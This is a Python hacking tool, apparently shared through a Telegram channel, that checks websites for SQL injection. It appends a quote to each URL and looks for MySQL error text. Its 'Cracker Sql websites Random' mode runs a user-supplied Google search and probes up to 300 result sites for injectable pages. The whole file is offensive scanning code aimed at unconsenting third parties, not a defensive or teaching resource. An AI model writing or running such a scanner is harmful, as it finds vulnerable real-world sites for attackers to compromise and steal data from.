import requests
import time
import os
import sys
from googlesearch import *
from colorama import Fore
G = Fore.GREEN
B = Fore.BLUE
Y = Fore.YELLOW
R = Fore.RED
W= Fore.WHITE
C = Fore.CYAN
M = Fore.MAGENTA

#--------------------start code--------------------#
def sql(url):
    try:    
        ur = requests.get(url+"'").status_code
        if ur == 200:
            r = requests.get(url+"'").text
            if 'MySQL' in str(r):
                print(B+' [ ✔ ] '+G+f'Found Sql Url {W}( {Y}{url}{W} )')
                time.sleep(1)
                print("")
            else:
                print(Y+' [ ✘ ] '+C+f'Not Sql Url {W}( {B}{url}{W} )')
                time.sleep(1)
                print("")                            
        else:
            print(B+' [ ✘ ] '+R+f'Not Found Url {W}( {M}{url}{W} )')
            time.sleep(1)            
            print("")            
    except:
        print('\n \033[0;90m--------------------\033[2;32mhttps://t.me/black_code_22\033[0;90m--------------------\n')        
        serch()
#--------------------google search--------------------#        
def serch():
    dead = input(B+' [ ✪ ] '+C+'Enter search : '+W)
    print('\n \033[0;90m--------------------\033[2;32mhttps://t.me/black_code_22\033[0;90m--------------------\n')
    for url in search(dead,stop = 300):
        sql(url)
#---------------------web site test------------------------#        
def web():
        url = input(B+' [ ✪ ] '+C+'Enter website : '+W)
        sql(url) 
        input(W+' Enter Express ............ ')
        os.system('clear')
        logo()   
#-------------------------logo-------------------------------#
def logo():
    print("""
\033[2;33m]     █                      █                             █
   ▄▄▄█   ▄▄▄    ▄▄▄    ▄▄▄█          ▄▄▄    ▄▄▄     ▄▄▄█   ▄▄▄
  █▀ ▀█  █▀  █  ▀   █  █▀ ▀█         █▀  ▀  █▀ ▀█  █▀ ▀█  █▀  █
 \033[2;31m █   █  █▀▀▀▀  ▄▀▀▀█  █   █         █      █   █  █   █  █▀▀▀▀
  ▀█▄██  ▀█▄▄▀  ▀▄▄▀█  ▀█▄██         ▀█▄▄▀  ▀█▄█▀  ▀█▄██  ▀█▄▄▀
""")
    print('\n \033[0;90m--------------------\033[2;32mhttps://t.me/black_code_22\033[0;90m--------------------\033[1;32m')
    print('  ( 1 )  Checker website Sql injction ')
    print('  ( 2 )  Cracker Sql websites Random ')
    print('  ( 0 )  EXIT...... ')
    print("")    
    me = int(input(B+'  ( ⌯ )  Enter number : '))
    if me == 1:
        print('\n\n \033[0;90m--------------------\033[2;32mhttps://t.me/black_code_22\033[0;90m--------------------\n')
        web()
    elif me == 2:
        print('\n\n \033[0;90m--------------------\033[2;32mhttps://t.me/black_code_22\033[0;90m--------------------\n')
        serch()
    elif me == 0:
        print('\n\n \033[0;90m--------------------\033[2;32mhttps://t.me/black_code_22\033[0;90m--------------------\n')
        sys.exit()
    else:
        print(R+' Try Again From Number ')
        time.sleep(1)
        os.system('clear')
        logo()
logo()     